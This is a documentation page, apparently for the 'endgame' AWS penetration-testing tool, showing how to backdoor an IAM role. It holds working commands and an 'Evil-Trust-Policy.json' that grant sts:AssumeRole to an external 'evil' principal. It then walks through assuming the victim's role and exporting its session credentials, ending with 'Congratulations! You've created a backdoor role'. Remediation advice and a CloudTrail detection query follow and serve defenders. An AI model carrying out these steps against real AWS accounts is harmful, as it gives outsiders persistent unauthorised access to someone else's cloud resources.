# IAM Roles (via AssumeRole)

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service iam --name test-resource-exposure
```

* Alternatively, to expose the resource using the AWS CLI:

Create a file titled `Evil-Trust-Policy.json` with the following contents:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Endgame",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::999988887777:user/evil"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```


Apply the evil Assume Role Policy by running the following from the victim account:

```bash
aws iam update-assume-role-policy --role-name test-resource-exposure --policy-document file://Evil-Trust-Policy.json
```

* To view the contents of the Assume Role Policy that grants access to the evil user, run the following:

```bash
aws iam get-role --role-name test-resource-exposure
```

* Observe that the output of the overly permissive AssumeRolePolicy match the example shown below.

## Example

Observe that the content of the `AssumeRolePolicyDocument` key allows `sts:AssumeRole` access from the evil principal (`arn:aws:iam::999988887777:user/evil`)

```json
{
    "Role": {
        "Path": "/",
        "RoleName": "test-resource-exposure",
        "RoleId": "",
        "Arn": "arn:aws:iam::111122223333:role/test-resource-exposure",
        "CreateDate": "2021-02-13T19:21:51Z",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "",
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "ec2.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                },
                {
                    "Sid": "AllowCurrentAccount",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::111122223333:root"
                    },
                    "Action": "sts:AssumeRole"
                },
                {
                    "Sid": "Endgame",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::999988887777:user/evil"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "Tags": [
            {
                "Key": "Owner",
                "Value": "yourmom"
            }
        ],
        "RoleLastUsed": {}
    }
}
```

## Exploitation

* Set your AWS Access keys to the Evil Principal (`arn:aws:iam::999988887777:user/evil`) credentials

* Verify that you can run `sts:AssumeRole` to the victim account

```bash
aws sts assume-role --profile evil --role-arn arn:aws:iam::111122223333:role/test-resource-exposure --role-session-name HotDogsAreSandwiches
```

* The output will contain `AccessKeyId`, `SecretAccessKey`, and `SessionToken` below. Note the values.

```
{
    "Credentials": {
        "AccessKeyId": "",
        "SecretAccessKey": "",
        "SessionToken": "",
        "Expiration": "2021-02-13T21:24:46Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "roleid:HotDogsAreSandwiches",
        "Arn": "arn:aws:sts::111122223333:assumed-role/test-resource-exposure/HotDogsAreSandwiches"
    }
}
```

* Set those values to your AWS credentials environment variables

```bash
export AWS_ACCESS_KEY_ID=outputfromAccessKeyId
export AWS_SECRET_ACCESS_KEY=outputfromSecretAccessKey
export AWS_SESSION_TOKEN=outputfromSessionToken
```

* To validate that you are leveraging the victim's credentials, run `aws sts get-caller-identity` (this API Call is the equivalent of `whoami`)

```bash
aws sts get-caller-identity
```

* Observe that the output of the call contains the Victim Account ID under `Account`, as well as an ARN that indicates you have assumed the victim role.

```
{
    "UserId": "AROAblah:HotDogsAreSandwiches",
    "Account": "111122223333",
    "Arn": "arn:aws:sts::111122223333:assumed-role/test-resource-exposure/HotDogsAreSandwiches"
}
```

* Congratulations! You've created a backdoor role in the victim's account 😈


## Remediation

* **Trusted Accounts Only**: Ensure that IAM roles can only be assumed by trusted accounts and the trusted principals within those accounts.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to Assume IAM Roles. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your IAM Roles**: Tightly control access to the following IAM actions:
      - [iam:UpdateAssumeRolePolicy](https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateAssumeRolePolicy.html): _Grants permission to update the policy that grants an IAM entity permission to assume a role_
      - [iam:GetRole](https://docs.aws.amazon.com/IAM/latest/APIReference/API_GetRole.html): _Grants permission to retrieve information about the specified role, including the role's path, GUID, ARN, and the role's trust policy_
      - [iam:ListRoles](https://docs.aws.amazon.com/IAM/latest/APIReference/API_ListRoles.html): _Grants permission to list the IAM roles that have the specified path prefix_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='iam.amazonaws.com' and eventName='UpdateAssumeRolePolicy'
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [update-assume-role-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/update-assume-role-policy.html)
* [Learn more about IAM cross-account trust](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_common-scenarios_aws-accounts.html)